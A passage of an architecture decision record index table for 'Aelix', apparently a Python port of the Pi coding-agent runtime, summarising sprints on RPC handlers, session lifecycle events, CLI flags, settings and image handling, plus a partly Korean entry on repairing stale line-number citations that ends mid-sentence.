| 0077 | [`AgentSessionRuntime` Pi Port + `rebindSession` Seam (FOUNDATION ONLY)](0077-agent-session-runtime-port.md)                                              | Accepted (Sprint 6h₄b / Phase 4.12 / W6 shipped)                    | Pi parity port of `AgentSessionRuntime` (`packages/coding-agent/src/core/agent-session-runtime.ts:67-374`) + `rebindSession` closure (`rpc-mode.ts:310-349`) as the FOUNDATION-ONLY layer. **NO new RPC commands wired** — counts stay 26 / 3 / 29. Harness-rebuild pattern (P-302 BINDING — `HarnessFactory: Callable[[Session], Awaitable[AgentHarness]]` preserves `_state.session_id` + action bindings + merged tools + cached session-name invariants) + `rebind_session` closure subset (P-303 — re-subscribe only; `bindExtensions` / `commandContextActions` waveform deferred to 6h₄c) + `run_rpc_mode` `runtime_host` shim (P-309 — backward-compat for 26 already-wired handlers; `_make_passthrough_runtime` raises `RuntimeError` on accidental replace per W4 LOW-3) + P-306 invariant test + P-307 / P-308 / P-313 / P-314 / P-315 / P-316 carry-forward to 6h₄c. 4 stubbed replace APIs (`switch_session` / `new_session` / `fork` / `import_from_jsonl`) raise `NotImplementedError("Sprint 6h₄c — ADR-0078")`. |
| 0078 | [Phase 4.12 Strict Superset Closure + Sprint 6h₄c Wiring Carry-Forward](0078-phase-4-12-strict-superset-closure.md)                                       | Accepted (Sprint 6h₄b / Phase 4.12 / W6 shipped)                    | Phase 4.12 closure — P-302~P-310 + P-318 roster + closure pin (`tests/pi_parity/test_phase_4_12_strict_superset.py`) + 26 supported / 3 deferred RPC split UNCHANGED (foundation sprint). DEFERRED owner rebrand ADR-0076 → ADR-0078 applied per spec §D.5; cascade pin allowlists in 4.4 / 4.9 / 4.10 / 4.11 extended with ADR-0078 prefix. NEW back-compat regression suite `tests/rpc/test_rpc_mode_runtime_shim.py` (7 P-309 / P-311 tests). Sprint 6h₄c carry-forward enumerated (3 session-tree handler wires + 4 stub fills + P-307 / P-308 / P-313 / P-314 / P-315 lift). |
| 0079 | [Session-tree handlers wired (`switch_session` / `fork` / `clone`) + runtime body fills](0079-session-tree-handlers-wired.md)                            | Accepted (Sprint 6h₄c / Phase 4.13 / W6 shipped — **PHASE 4 RPC CLOSURE**) | Pi parity wiring of 3 session-tree RPC handlers + 3 of 4 runtime replace body fills via `JsonlSessionRepo.open` / `create` / `fork`. `AgentSessionRuntime.__init__` extended with required keyword-only `repo` + `fs` (P-324 BINDING) + 3 stubbed bodies filled (P-325) — `import_from_jsonl` stays stubbed per ADR-0080. NEW `_SUPPORTED_HANDLERS_RUNTIME_HOST` arity class + `_bind_runtime_host` adapter (P-326) + `selectedText → text` wire rename with key-omission (P-327) + `clone` leaf_id pre-capture (P-328) + P-329 deliberate convergence (Aelix handlers MUST NOT call rebind manually) + Sprint 6d `_handle_new_session` stub REPLACED — ADR-0058 `parent_session` carry-forward CLOSES (P-330) + `_apply_for_test` test seam REMOVED with 6h₄b tests migrated to real public API (P-331) + 4 W4 MINOR cleanups applied. |
| 0080 | [Phase 4.13 Strict Superset Closure + Phase 4 RPC Roster CLOSED](0080-phase-4-13-strict-superset-closure.md)                                              | Accepted (Sprint 6h₄c / Phase 4.13 / W6 shipped — **PHASE 4 RPC ROSTER CLOSED**) | Phase 4.13 closure — P-323~P-331 roster + closure pin (`tests/pi_parity/test_phase_4_13_strict_superset.py`) + **29 supported / 0 deferred / 29 total** = full Pi parity for `RpcCommand` discriminator union at SHA `734e08e`. `SUPPORTED_COMMANDS == RPC_COMMAND_TYPES` full set equality + `DEFERRED_COMMANDS == {}` literal empty + 5 strict invariants beyond count parity (4-entry `RUNTIME_HOST` arity, fork text-omission, clone text-drop, leaf_id pre-capture ordering, exactly-once rebind, `_apply_for_test` removed). **LAST Phase 4 RPC sprint** — Sprint 6h₅+ carry-forward roster covers runtime / extension polish (P-307 / P-308 / P-314 / P-315 + cwd validation + cross-cwd import + `sessionStartEvent` + TUI `/import` body). P-313 `HarnessFactory` 4-field refresh CONFIRMED DROPPED (harness-rebuild encapsulates services + diagnostics + model_fallback_message via factory closure). |
| 0081 | [Extension event Pi parity (4 events + session_cwd + W5 P-355 dispose ordering)](0081-extension-event-pi-parity.md)                                       | Accepted (Sprint 6h₅a / Phase 4.14 / W6 shipped)                    | Pi parity wiring of 4 extension session lifecycle events (`session_start` / `session_before_switch` / `session_before_fork` / `session_shutdown`) end-to-end on top of the 6h₄c `AgentSessionRuntime` foundation. P-332~P-343 roster + `_emit_session_shutdown_event` helper + real `_emit_before_switch` / `_emit_before_fork` bodies (P-308 carry-forward CLOSES) + `_teardown_current` ordering correction (P-340 — Pi `:149-157` **EMIT → INVALIDATE → DISPOSE**; the 6h₄b reversed order was a Pi misread) + `dispose` adds `session_shutdown` emit (P-307 carry-forward CLOSES) + `previous_session_file` snapshot timing + `_finish_session_replacement` `session_start` emit + `session/session_cwd.py` Pi port (async-adapted) + 4 new `@dataclass` event payloads + 2 cancel-aware result types + 35-overload `HookBus.on` / `ExtensionAPI.on` + `_reducer_session_before` widening. W4/W5 BLOCKING fixes: P-344 line citation corrections (510-557 ambiguous → 513-519/522-526/529-533/552-557 verified at SHA `734e08e`) + P-345 `SessionBeforeForkResult.skip_conversation_restore` Pi parity field + P-346 `format_missing_session_cwd_error` Pi-verbatim format + P-347 `format_missing_session_cwd_prompt` port + **P-355 `dispose` ordering correction (**EMIT → INVALIDATE → DISPOSE** matches `_teardown_current`; the W2 §J "intentional asymmetry" claim was a Pi misread)**. W4 MEDIUM: `switch_session` lifts `repo.open` + `assert_session_cwd_exists` BEFORE `_emit_before_switch` (Pi `:184-189` ordering). W4 MINOR-3: `_emit_before_*` required args (no defaults). |
| 0082 | [Phase 4.14 Strict Superset Closure + 6h₅b/6h₅c Carry-Forward](0082-phase-4-14-extension-events-closure.md)                                              | Accepted (Sprint 6h₅a / Phase 4.14 / W6 shipped)                    | Phase 4.14 closure — P-332~P-355 roster + closure pin (`tests/pi_parity/test_phase_4_14_extension_events.py`) + **29 supported / 0 deferred / 29 total** UNCHANGED (extension polish doesn't change RPC roster) + 35-name `HookEventName` cascade + 35-overload count + shared `_reducer_session_before` across 4 cancellable events + Pi line citation drift detector + cancel-aggregation first-cancel-wins + exception isolation under `error_mode="continue"` + reducer return-type union widened + dispose ordering pin (P-355 — `dispose` and `_teardown_current` share **EMIT → INVALIDATE → DISPOSE**) + switch_session assert-before-emit ordering pin (W4 MEDIUM — Pi `:184-189`) + `SessionBeforeForkResult` field-shape pin (P-345 — `{cancel, skip_conversation_restore}`) + Pi-verbatim error/prompt format pins (P-346 / P-347). **6h₅b carry-forward** (CLOSED per ADR-0083 / 0084): `with_session` / `setup` callbacks + `forkFrom` cross-cwd + `import_from_jsonl` body + P-351 ExtensionRunner.invalidate. **6h₅c carry-forward**: HTML visual fidelity + `_get_context_usage_safe` + live `session_id` + `ImageContent` + bootstrap `session_start` + factory bootstrap `assertSessionCwdExists`. **Phase 4 RPC STAYS CLOSED**. |
| 0083 | [Runtime callback Pi parity (`with_session` / `setup` / `import_from_jsonl` / `fork_from` / `ExtensionRunner.invalidate` + W5 P-364~P-368 fixes)](0083-runtime-callback-pi-parity.md) | Accepted (Sprint 6h₅b / Phase 4.15 / W6 shipped)                    | Pi parity wiring of runtime callback surface on top of the 6h₅a extension event lifecycle wiring. P-356~P-363 roster + `ReplacedSessionContext` Protocol (P-356 — Protocol over `SimpleNamespace`, runtime_checkable) + `create_replaced_session_context` factory (P-357) + `with_session` 2-stage callback plumbed onto 3 replace APIs + `_finish_session_replacement` (P-358) + `setup` callback in `new_session` AFTER apply BEFORE rebind + message rebuild (P-359) + `import_from_jsonl` real body replacing 6h₄c stub (P-360 — Pi `:329-364`) + `JsonlSessionRepo.fork_from` cross-cwd import (P-361 — Pi `session-manager.ts:1353-1394`) + `ExtensionRunner.invalidate` + `_invalidate_runtime` runtime bridge (P-362 SYNTHESIS per spec §J — runner is Pi-named entry point delegating; runtime is single source of truth) + `runner.invalidate` calls in teardown/dispose between EMIT and `before_session_invalidate` (P-363) + `PI_STALENESS_MESSAGE` Pi verbatim constant shared across both packages. W4/W5 audit triage: P-364 `ReplacedSessionContext` Protocol extended with 6 `ExtensionCommandContext` methods (Pi `:371` extends) + factory `runtime` kwarg threading the 3 runtime commands + P-365 `assert_active` reads through bridge raising `RuntimeError` (avoids reverse import) + P-366 `SessionImportFileNotFoundError` Pi-verbatim `File not found: {file_path}` + `file_path` attr (Pi `:39-47`) + P-367 `JsonlSessionRepo.open(cwd_override=)` repo seam replaces `storage._metadata` mutation + P-368 `fork_from(session_dir=)` optional Pi 3rd parameter. |
| 0084 | [Phase 4.15 Strict Superset Closure + 6h₅c Carry-Forward](0084-sprint-6h5b-closure.md)                                                                    | Accepted (Sprint 6h₅b / Phase 4.15 / W6 shipped)                    | Phase 4.15 closure — P-356~P-368 roster + 6 new unit test files lock the runtime callback Pi parity invariants (Protocol conformance + `with_session` ordering + `setup` ordering + `import_from_jsonl` cancel/copy/cwd-override paths + `fork_from` ALL-entries no-truncation + `ExtensionRunner.invalidate` bridge propagation + `assert_active` SYNTHESIS no-op + Pi-verbatim error format + `file_path` attr) + **29 supported / 0 deferred / 29 total** UNCHANGED (runtime / extension polish doesn't change RPC roster) + `ReplacedSessionContext` Protocol widened 13 → 19 members (P-364 W6 — adds 6 `ExtensionCommandContext` methods per Pi `:371`). ADR-0082 §"Sprint 6h₅b carry-forward" CLOSED (5 binding + 1 W2-already-shipped item). **6h₅c carry-forward**: HTML visual fidelity + `ImageContent` rendering + `_get_context_usage_safe` real impl + live `session_id` + Pi-source-grep tooling + bootstrap `session_start` (factory pattern change required) + factory bootstrap `assertSessionCwdExists`. **Phase 4 RPC STAYS CLOSED**. |
| 0085 | [Phase 4.16 Visual Fidelity + Context Usage + Bootstrap session_start + Factory cwd + ImageContent](0085-phase-4-16-visual-fidelity-and-closure.md)         | Accepted (Sprint 6h₅c / Phase 4.16 / W6 shipped)                    | Pi parity port closing the 5 binding carry-forward items from ADR-0084 §"Sprint 6h₅c carry-forward" — P-369~P-373 + W4/W5 audit triage (P-374 MAJOR + W4 MEDIUM + P-377 MINOR + W4 NIT). 4 Pi-parity helpers in `session/compaction.py` (`calculate_context_tokens` / `estimate_tokens` / `estimate_context_tokens` / `get_latest_compaction_entry`) + :class:`ThinkingContent` branch in `estimate_tokens` (W4 MEDIUM) + :meth:`AgentHarness._get_context_usage_safe` real async impl over Pi `compaction.ts:135-279` + `agent-session.ts:2946-2990` (P-369) + `_ExtensionContext.get_context_usage` real sync bridge via heuristic estimate path (P-374 W5 MAJOR fix replaces Sprint 5a `return None` stub) + module-level :func:`create_agent_session_runtime` async factory with bootstrap `session_start(reason="startup")` emit + factory-bootstrap `assert_session_cwd_exists` site (P-370 + P-371 — Pi `:391` + `:326` + `:2050`) + `_export_html/` directory restructure with Pygments + markdown-it-py + curated dark theme (P-372 — replaces Sprint 6h₃ single-file minimal renderer) + :class:`ImageContent` inline base64 `<img>` rendering (P-373) + strict Pi `tool-image` class literal (P-377 W5 MINOR fix — drop W2 combined `message-image tool-image`). 4 new test files (`tests/harness/test_context_usage.py` + `tests/test_factory_assert_session_cwd.py` + `tests/test_bootstrap_session_start.py` + `tests/test_export_html_visual_fidelity.py`). RPC roster STAYS CLOSED at 29 / 0 / 29. |
| 0086 | [A 단계 Closure — Phase 4 RPC + Extension Events + Runtime Callbacks + Visual Fidelity COMPLETE](0086-a-stage-closure.md)                                  | Accepted (Sprint 6h₅c / Phase 4.16 / W6 shipped — **A 단계 CLOSED**) | A 단계 closure milestone — 14-row delivery ledger pairs every binding carry-forward item from ADR-0080 + ADR-0082 + ADR-0084 with a delivering sprint + owner ADR across the 6a → 6h₅c sprint chain. Phase 4 RPC roster CLOSED at 29 / 0 / 29 (ADR-0080 / Sprint 6h₄c) + 35-name `HookEventName` cascade preserved (Sprint 6h₅a widening; subsequent sprints unchanged) + 35-overload `HookBus.on` / `ExtensionAPI.on` count preserved + `ReplacedSessionContext` Protocol at 19 members (Sprint 6h₅b P-364) + `PI_STALENESS_MESSAGE` Pi-verbatim single source of truth + uniform **EMIT → INVALIDATE → DISPOSE** ordering in `_teardown_current` AND `dispose` (Sprint 6h₅a P-355 W5 BLOCKING correction). B 단계 (next phase) candidate scope enumerated (Phase 5 CLI + image-models parallel registry + typed `Model.compat` discriminated union + `enableGitHubCopilotModel` POST automation + `Model.knowledgeCutoff`/`releaseDate` Pi-untyped fields). Sprint 6h₅d carry-forward scoped to visual polish + grep tooling + minor cleanups (no RPC dispatch impact). Pi pin advances permitted starting B 단계 per ADR-0034 update policy. **Phase 4 RPC STAYS CLOSED**. Amended Sprint 6h₅d — 3 non-UI cleanup rows CLOSED per ADR-0087 (P-375 + MINOR-1 + MINOR-3); `reload()` emit branch re-deferred to Phase 5 with 5-primitive ledger. |
| 0087 | [Sprint 6h₅d Phase 4.17 — Non-UI Carry-Forward Closure](0087-sprint-6h5d-non-ui-cleanup.md)                                                                | Accepted (Sprint 6h₅d / Phase 4.17 / W6 shipped)                    | Non-UI carry-forward closure on top of A 단계 closure (ADR-0086). 3 binding cleanup items CLOSED: §C P-375 monkeypatch fragility (hoist `SessionStartHookEvent` + `assert_session_cwd_exists` imports to module top-level + `tests/test_factory_assert_session_cwd.py` migrates from manual `try/finally` rebind to `monkeypatch.setattr` against the single hoisted binding site) + §D MINOR-1 `_export_html/template.py` 196-line `_THEME_CSS` f-string split into `_BASE_THEME_CSS + "\n" + _PYGMENTS_CSS + "\n" + _IMAGE_CSS` string concat (drops brace-doubling on every CSS literal; file correction vs ADR-0085 cite — the f-string was in `template.py`, not `format.py`) + §E MINOR-3 `AgentHarness.session` public read-through property (Pi `runtimeHost.session` `agent-session-runtime.ts:83-85`) + 6 callsite migrations (`RuntimeHost.session` getter / `RuntimeHost.cwd` getter / factory check + assert call / `set_session_name` RPC handler / REPL `user_bash` path). 3 new + 1 rewritten unit-test files: `tests/test_factory_assert_session_cwd.py` (REWRITE — `monkeypatch.setattr`) + `tests/test_export_html_template_concat.py` (NEW — 2 tests: Pygments classes + base-theme + image classes) + `tests/harness/test_session_property.py` (NEW — 2 tests: bound + unattached). §B Pi `reload()` bootstrap emit branch RE-DEFERRED to Phase 5 with full 5-primitive ledger (`settingsManager.reload` / `resetApiProviders` / `_resourceLoader.reload` / `flagValues` round-trip / `_buildRuntime` all missing in Aelix; porting only `:2401` emit would fire over a session that did NOT actually reload — violates binding principle). UI items (ANSI/tool-renderer/sidebar/theme math/pixel-perfect pins) stay deferred to Phase 5 / B 단계 per user consultation gate. Grep gate: `grep -rn "harness\._session" packages/aelix-coding-agent/ packages/aelix-agent-core/src/aelix_agent_core/runtime/` returns 0 matches at sprint close. ADR-0086 §"Sprint 6h₅d carry-forward" amended in lockstep (strikethrough closed rows + reload re-defer rationale). **RPC roster STAYS CLOSED at 29 / 0 / 29.** Pi pin held at `734e08e` (no advance — non-UI cleanup imports no new Pi feature). |
| 0088 | [Phase 5b TUI Library Decision — Analysis Basis (Proposed / Deferred)](0088-phase-5b-tui-library-decision.md)                                              | Proposed (deferred to Phase 5b kickoff)                              | Phase 5b interactive TUI library-selection analysis captured during Sprint 6h₆ W0 study. Pi `pi-tui` (~9,000 LOC custom) ports against a `ExtensionUIContext` 31-method surface where extensions ship `(tui, theme, kb, done) => Component` factories. Library candidates evaluated: **textual** (MIT, reactive, asyncio, ~28k stars) + **rich** (MIT, render primitives only) + **prompt-toolkit** (BSD-3, IPython/pgcli, asyncio v3) + **blessed** (MIT, too low-level). Hybrid combos: textual+rich / prompt-toolkit+rich / textual alone. **Recommendations** (advisory): PRIMARY textual+rich (best extensibility + first-party combo + rich-export reuse), ALTERNATIVE prompt-toolkit+rich (closer to Pi imperative model + best Buffer editor), CONTINGENCY textual alone (drop rich if integration friction outweighs reuse). **CRITICAL invariant**: `Component` Protocol MUST be library-agnostic — do NOT alias `Component = textual.Widget` directly at the public extension API boundary, or extensions lock in. 10 open questions enumerated (extras dep model / reactive semantics / Windows support / Kitty image protocol / theme parity / snapshot testing / editor seam / `OverlayOptions` shape / theme live-update / event-stream backpressure). **Decision DEFERRED** to Phase 5b W0 with explicit user consent. Until Phase 5b lands, `aelix` without `--print` / `--mode` raises `NotImplementedError` with stderr diagnostic pointing here. |
| 0089 | [Sprint 6h₆ Phase 5a-i + 5a-ii — Non-Interactive CLI Closure](0089-sprint-6h6-phase-5a-i-and-ii.md)                                                        | Accepted (Sprint 6h₆ / Phase 5a-i + 5a-ii / W6 shipped — **B 단계 OPENS**) | Pi parity port of the non-interactive half of the Pi CLI entrypoint. P-385~P-413 roster (W0 P-385~P-394 + W4/W5 P-395~P-413). Components: `cli/config.py` (APP_NAME = "aelix" Aelix-additive divergence per HTML export precedent) + `cli/args.py` (Pi `cli/args.ts` 354 LOC hand-rolled linear parser; `argparse`/`click` rejected per P-386 — cannot cleanly express 3 Pi-specific features) + `cli/file_processor.py` (text branch only; image branch deferred 5a-iii) + `cli/initial_message.py` (Pi `.shift()` mutation preserved) + `modes/print_mode.py` (Pi `modes/print-mode.ts` 158 LOC 9-step lifecycle) + `cli/entry.py:main_sync` (Pi `main.ts:96-113` + `:423-716` reduced) + `__main__.py` + `[project.scripts] aelix`. **Closed W6 fixes**: P-396 `--print` `---` triple-dash escape (W5 MAJOR Pi `args.ts:123-129`) + P-397 `--list-models` `@` exclusion (W5 MAJOR Pi `args.ts:154-160`) + P-398 unknown-flag `@` exclusion (W5 MAJOR Pi `args.ts:167-180`) + W4 MAJOR `print_help(out: TextIO \| None)` typing upgrade. **Aelix-additive divergences**: 12 documented (P-395 harness vs session subscribe + P-399 stricter `--mode` missing-value diagnostic + P-400 abbreviated `print_help` + P-401 parsed `--append-system-prompt` not yet wired + P-402 TTY second-pass deferred + P-403 `killTrackedDetachedChildren` no Aelix equivalent + P-404 double-dispose suppress + `takeOverStdout` punted + SettingsManager/`--list-models` real/migrations/session-picker deferred + interactive raises `NotImplementedError`). Interactive mode points to ADR-0088 via stderr diagnostic. **RPC roster STAYS CLOSED at 29 / 0 / 29.** Pi pin held at `734e08e` (no advance — Sprint 6h₆ scope is non-interactive CLI shell only). Verification: 2077 passed + 1 skipped + 8 pyright errors baseline + ruff clean. **B 단계 (Phase 5) formally opens.** |
| 0090 | [Sprint 6h₇a Phase 5a-iii-α — List-Models + Append-System-Prompt (Partial Phase 5a-iii)](0090-sprint-6h7a-phase-5a-iii-alpha.md)                                       | Accepted (Sprint 6h₇a / Phase 5a-iii-α / W6 shipped) | Partial Phase 5a-iii closure on top of Sprint 6h₆ (ADR-0089) — closes the two deferred carry-forwards (`--list-models` deferred stderr diagnostic + parsed-but-unwired `--append-system-prompt`) WITHOUT paying for the full Pi 5a-iii surface (SettingsManager / ResourceLoader / `@file` / image branch / migrations / session-picker reserved for Sprint 6h₇b + beyond). Ports: §B Pi `tui/src/fuzzy.ts` (137 LOC stdlib-only) → `util/fuzzy.py` with LOAD-BEARING scoring constants (Exact -100 / Word-boundary -10 / Consecutive -5 / Gap +2 / Position +0.1×i / Alphanumeric-swap +5); §C Pi `cli/list-models.ts` (111 LOC) → `cli/list_models.py` with `format_token_count` (200000→"200K" / 1500000→"1.5M" / 2000000→"2M" trailing `.0` stripped) + 6-column table + `(provider.lower(), id.lower())` sort + fuzzy filter; §C `cli/entry.py:162-168` REPLACES Sprint 6h₆ deferred stderr diagnostic with `await list_models(ModelRegistry.create(AuthStorage(get_agent_dir() / "auth.json")), parsed.list_models)`; §D `AgentHarnessOptions.append_system_prompt: list[str]` field + `AgentHarness.__init__` `"\n\n"` join assembly site + `cli/entry.py:_build_harness_options` defensive-copy wire. **Aelix-additive divergences (BINDING)**: plain stderr load-error warning (NO `chalk.yellow` / NO ANSI) + inline no-models-available fallback (NO `formatNoModelsAvailableMessage` auth-guidance import) + literal-text-only `--append-system-prompt` (NO `@file` / NO auto-discovery — defers to ResourceLoader) + init-time prompt assembly (Pi rebuilds on every reload via `_rebuildSystemPrompt`; Aelix 6h₇a has no reload trigger in scope so init-time is semantically equivalent for supported lifecycle) + `FuzzyMatch.indices` Aelix-additive forward-compat field (Pi exposes only `matches` + `score`). 5 new + 1 rewritten test files: `tests/util/test_fuzzy.py` (17 tests = 15 Pi-parity ports + 2 Aelix-additive `indices`) + `tests/cli/test_list_models.py` (14 tests covering `format_token_count` + table shape / sort / filter / empty / fallback / load-error / `True`/`None` pattern / images) + `tests/cli/test_entry_router.py::test_list_models_invokes_list_models_and_exits_0` (REWRITE — was `test_list_models_deferred_returns_1`) + `tests/harness/test_append_system_prompt.py` (5 tests) + `tests/cli/test_append_system_prompt.py` (3 tests). **RPC roster STAYS CLOSED at 29 / 0 / 29.** Pi pin held at `734e08e` (no advance — Sprint 6h₇a imports no new Pi feature). Reference companions: ADR-0089 (Sprint 6h₆ closure carry-forward) / ADR-0087 (P-380 reload primitives ledger) / ADR-0086 (carry-forward catalog) / ADR-0088 (Phase 5b TUI library decision — ANSI lands later) / ADR-0034 (Pi pin amendment row). Sprint 6h₇b (next) — SettingsManager full standalone port (~1400-1600 LOC) is BINDING carry-forward. |
| 0091 | [Sprint 6h₇b Phase 5a-iii-β — SettingsManager Standalone Port](0091-sprint-6h7b-phase-5a-iii-beta.md) | Accepted (Sprint 6h₇b / Phase 5a-iii-β / W6 shipped) | Pi `core/settings-manager.ts` (1067 LOC TypeScript) → Python `aelix_ai/settings/` standalone package. `Settings` @dataclass tree (33 fields + 11 nested types + 5 Literal unions + `DEFAULT_THINKING_LEVEL = "medium"`) + `SettingsStorage` Protocol + `FileSettingsStorage` (`fcntl.flock` + atomic write + `0o644`) + `InMemorySettingsStorage` + `default_settings_path` XDG + `default_project_settings_path` (`.aelix/` namespace per ADR-0034) + `SettingsManager` 3 factories + `deep_merge_settings` + `migrate_settings` 4 transforms (`queueMode→steeringMode` / `websockets→transport` / skills object→array / `retry.maxDelayMs→retry.provider.maxRetryDelayMs`) + `reload()` 5-step + `_persist_scoped_settings` re-read-before-write merge (external-edit preservation) + async write queue + ~80 getters/setters + `drain_errors`. `AgentHarnessOptions.settings_manager: SettingsManager \| None` field + `AgentHarness.settings_manager` property + `AgentHarness.reload()` 3-step stub (Pi `agent-session.ts:2382-2398` step 1 only; 4 remaining P-380 primitives deferred per ADR-0087). **8 Aelix-additive divergences**: `fcntl.flock` vs `proper-lockfile` / `.aelix/` namespace / `aelix_ai/settings/` placement / migration tests added / lock-contention tests added / `0o644` permissions / `PI_*` env vars retained / 3-step reload stub. Test files: `tests/settings_manager/` (7 types + 31 manager + 4 bug + ~89 getters/setters + 16 migration + 3 locking) + `tests/harness/test_harness_reload.py` (4 tests). **RPC roster STAYS CLOSED at 29 / 0 / 29.** Pi pin held at `734e08e` (no advance). |
| 0092 | [Sprint 6h₈ Phase 5a-iv — Image + Migrations + --continue Closure](0092-sprint-6h8-phase-5a-iv.md) | Accepted (Sprint 6h₈ / Phase 5a-iv / W6 shipped) | Closes Sprint 6h₆ carry-forwards (image branch / `--continue` / `takeOverStdout`) + Sprint 6h₇b carry-forward (migrations). §B Pi `utils/mime.ts:1-74` → `util/image_detect.py` magic-byte detection (JPEG / PNG / GIF / WebP + animated PNG rejection + truncated JPEG `0xF7` rejection). §B Pi `utils/image-resize.ts:1-176` → `util/image_resize.py` Pillow-based port (`ImageResizeOptions` 2000×2000 / 4.5 MB / q=80; `ResizedImage` frozen dataclass; iterative encode search PNG + 5 JPEG qualities + dim × 0.75 fallback; `ImageOps.exif_transpose` replaces ~83 LOC Pi manual TIFF parsing). §B `Pillow>=11.0,<12.0` dep added (pyright stubs since 10.0 — zero new baseline errors). §B `cli/file_processor.py` REPLACES Sprint 6h₆ image-skip stub with real branch (magic bytes → base64 → optional resize → `ImageContent` append + dimension note text). §C `aelix_ai/migrations.py` NO-OP stub (Aelix has no legacy data per W0; Pi 7 cleanups unnecessary). §D `JsonlSessionRepo.find_most_recent(cwd)` + `_is_valid_session_file` (Pi parity `findMostRecentSession` + `isValidSessionFile` mtime DESC sort + header validation; diverges from existing `list()` `created_at` sort — `list()` kept as-is). §D `cli/entry.py` `--continue` short-circuit + 3 incompatible-flag validation + `--resume` NotImplementedError (Phase 5b TUI). §E `takeOverStdout` SKIPPED (Aelix RPC mode already uses `contextlib.redirect_stdout`; print-mode wrapper deferred to extension framework Sprint 6i+, ADR-0058). **8 Aelix-additive divergences**: Pillow vs Photon WASM / `exif_transpose` helper / NO-OP migrations / `find_most_recent` mtime vs `list()` `created_at` / `takeOverStdout` skip / magic-byte over extension / `path.name` basename in file wrapper / `_is_valid_session_file` as `@staticmethod`. New test files: `tests/util/test_image_detect.py` (19) + `tests/util/test_image_resize.py` (16) + `tests/test_migrations.py` (4) + `tests/session/test_find_most_recent.py` (10) + `tests/cli/test_continue_flag.py` (13). `tests/cli/test_file_processor.py` REWRITE drops image-skip warning tests, adds 9 real image processing tests. **RPC roster STAYS CLOSED at 29 / 0 / 29.** Pi pin held at `734e08e` (no advance). |
| 0093 | [Sprint 6h₇c Phase 5a-iii-γ — ADR-0087 P-380 Reload Primitives Closure](0093-sprint-6h7c-p380-closure.md) | Accepted (Sprint 6h₇c / Phase 5a-iii-γ / W6 shipped) | Expands the Sprint 6h₇b `AgentHarness.reload()` 2-op stub (ADR-0091 §E) into the full **7-op Pi parity chain** (`agent-session.ts:2382-2413`). §B `reset_api_providers()` module function (Pi `register-builtins.ts:400-403`; Aelix has no module-level lazy provider cache so the port is a registry-flush wrapper around `clear_providers()`) + `ModelRegistry.reset()` Pi-parity naming alias for `refresh()` (semantic identity). §C `_ExtensionRuntime.flag_values: dict[str, bool \| str]` + `get_flag_values` (shallow-copy semantic) + `set_flag_value` (Pi `runner.ts:409-411`) + `ExtensionRunner` `_runtime` bridge field + delegation. §D `AgentHarness._rebuild_tool_registry() -> list[AgentTool]` (extracted from `__init__:509-516`; merge semantic preserved — extensions setdefault, options override). §E `AgentHarness._emit_session_shutdown(reason)` + `_emit_session_start(reason)` private async wrappers (Pi `runner.ts:177-189` + `agent-session.ts:2407`; gate on `has_handlers`, return True/False). §F `reload()` 7-op body (guard → snapshot flag_values → session_shutdown emit → settings_manager.reload → reset_api_providers + conditional model_registry.reset → has_bindings gate → session_start emit + resources_discover). **7 Aelix-additive divergences**: registry-flush only (no auto-re-register builtins) / `reset` alias / `dict` vs `Map` / partial `_buildRuntime` extraction (tool merge only) / `has_bindings` proxy = `bool(extension_runner.extensions)` (Pi 4-field UI check Phase 5b ADR-0033) / harness-private emit wrappers vs Pi module-level helper / `flag_values` snapshot UNUSED this sprint (round-trip Phase 5b). **ADR-0087 P-380 final status**: 5/5 addressed (3 CLOSED + 2 deferred — ResourceLoader port + `_buildRuntime` full extraction both Phase 5b). New test files: `tests/test_api_registry_reset.py` (5) + `tests/model_registry/test_model_registry_reset.py` (5) + `tests/harness/test_extension_runner_flag_values.py` (9) + `tests/harness/test_rebuild_tool_registry.py` (8) + `tests/harness/test_session_lifecycle_emit.py` (7). `tests/harness/test_harness_reload.py` EXTENDED with 7 new tests on top of 4 existing. **RPC roster STAYS CLOSED at 29 / 0 / 29.** Pi pin held at `734e08e` (no advance). |
| 0223 | [Line-number citations are pinned by their text, and could not be repaired mechanically](0223-line-number-citations-are-pinned-by-their-text-not-maintained-by-hand.md) | Accepted (2026-08-16) | ADR-0220 §8의 "~19개 인용 재유도" 잔여를 열었더니 **25배**였다. 살아있는 사이트(소스·테스트·휠 동봉 가이드·루트 md) **793개 중 551개(69%)가 틀림** — #101의 9/65도, 이번 배치의 ~19개도 전체의 일부였고 나머지 ~520개는 그 이전부터 썩어 있었음. 추정이 아니라 793건을 전부 문장과 대조한 값(정상 242 · 줄 재유도 539 · 산문 교체 12). 🔴 **핵심은 기계적으로 못 고친다는 것**: `git blame`으로 "인용이 쓰인 커밋의 대상 텍스트"를 앵커 삼아 455건을 정확 블록 일치로 재배치한 뒤, 적대적 감사가 **247건을 산문 대조 → 98건(40%) 여전히 오답**. 원인은 도구가 아니라 **인용의 약 1/4이 쓰인 날부터 자기 문장과 안 맞았다**는 것 — 전수 패스 최종 **189/793 = 24%**. 예: `test_prompt_file_flags.py:12`가 "`_apply_prompt_files` runs at `entry.py:1799`"라는데 1799는 lazy-import 주석이고 호출은 1842 — blame 커밋에서도 틀렸음. 따라서 충실한 재배치는 **틀린 포인터를 새 좌표로 옮길 뿐**이고, 그 위에 락을 씌우면 오답을 영구히 얼린다. **결정 = 산문이 진실, 앵커는 증거** → 793건 전수 재유도(20배치 워크플로) 후 락+게이트. 🔴 **도구 버그 2건도 내가 만든 것**: (a) `str.splitlines()`는 U+2028·폼피드에서도 줄을 나눠 sed/awk/git/에디터/트레이스백과 **줄 번호가 다름** — 그런 파일이 트리에 5개, 그중 하나가 **가장 많이 인용되는 `cli/agent_context.py`**라 그리로 가는 인용이 전부 조용히 1줄 낮게 나왔다(줄 세는 곳이 3군데라 3개 다 사보타주로 막음); (b) 연속 인용 `` `:189-193` ``은 **이전 줄**의 파일을 이을 수 있는데 "같은 줄의 마지막 인용"을 쓰면 `reaper.py:278`이 엉뚱한 파일로 붙어 **맞던 인용을 틀리게** 만들었다 → 같은 줄에서 **앞서는** 인용만 상속. **퍼지 재배치는 금지**(가장 특징적인 줄−오프셋이 `resolver.py:183-206`을 맨 `profile: AgentProfile,` 파라미터 줄에 착지시킴 — 초록 게이트 아래의 오답이 부패보다 나쁨). **게이트 범위**: `packages/**`·`tests/**`·`docs/guides/**`·루트 `*.md`만. `docs/decisions/`와 `.omc/specs/`는 **날짜 박힌 기록**이라 의도적으로 늙게 둠(테스트가 실제로 스캔 안 함을 확인). 미해결 인용 27건(pi의 `.ts`·mcp SDK·httpx·모호한 stem)은 수를 핀으로 박아 **조용히 늘지 못하게** 함. **잔여**: 락은 